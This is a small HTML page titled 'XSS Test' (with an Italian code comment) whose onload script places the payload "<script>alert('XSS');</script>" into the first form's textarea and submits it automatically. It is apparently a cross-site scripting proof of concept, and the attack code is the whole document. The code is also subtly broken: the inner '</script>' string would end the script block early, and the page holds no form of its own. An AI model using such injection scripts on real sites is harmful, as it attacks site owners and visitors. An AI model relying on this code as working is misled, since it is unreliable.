<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Test</title>
</head>
<body>
    <script>
        // Trova il form di commenti e invia un payload XSS
        function submitXSS() {
            var form = document.querySelector('form');
            if (form) {
                var textarea = form.querySelector('textarea');
                if (textarea) {
                    textarea.value = "<script>alert('XSS');</script>";
                    form.submit();
                }
            }
        }
        window.onload = submitXSS;
    </script>
</body>
</html>
